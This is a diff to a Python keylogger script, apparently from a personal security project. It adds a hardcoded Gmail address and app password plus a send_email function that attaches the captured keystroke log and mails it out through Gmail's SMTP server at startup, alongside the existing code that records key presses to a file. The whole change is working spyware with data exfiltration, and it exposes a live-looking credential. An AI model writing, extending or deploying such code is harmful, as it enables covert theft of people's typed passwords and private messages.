@@ -31,7 +31,37 @@ import os
 
 # define logger save path
 keys_information = "key_log.txt" 
-file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/"
+file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/key_log.txt"
+
+email_addr = "blkshyguy0o0@gmail.com"
+password = "bsky limo dtcv tdjf"
+
+toaddr = "blkshyguy0o0@gmail.com"
+
+def send_email(filename, attachment, toaddr):
+    msg = MIMEMultipart()
+    msg['From'] = email_addr
+    msg['To'] = toaddr
+    msg['Subject'] = "KeyLog File"
+    body = "Email body"
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, "rb") #rb = read binary
+    base = MIMEBase('attachment', 'octect')
+    base.set_payload((attachment).read())
+    encoders.encode_base64(base)
+    base.add_header('Content-Disposition', "attachment; filename %s" % filename)
+    msg.attach(base)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(email_addr, password)
+    text = msg.as_string()
+    s.sendmail(email_addr, toaddr, text)
+    s.quit()
+
+send_email(keys_information, file_path, toaddr)
 
 keys =[]
 
@@ -42,7 +72,7 @@ def on_press(key):
     write_file(keys)
 
 def write_file(keys):
-    with open(file_path + keys_information, "a") as f:
+    with open(file_path, "a") as f:
         f.write(str(keys))
         f.close()
 
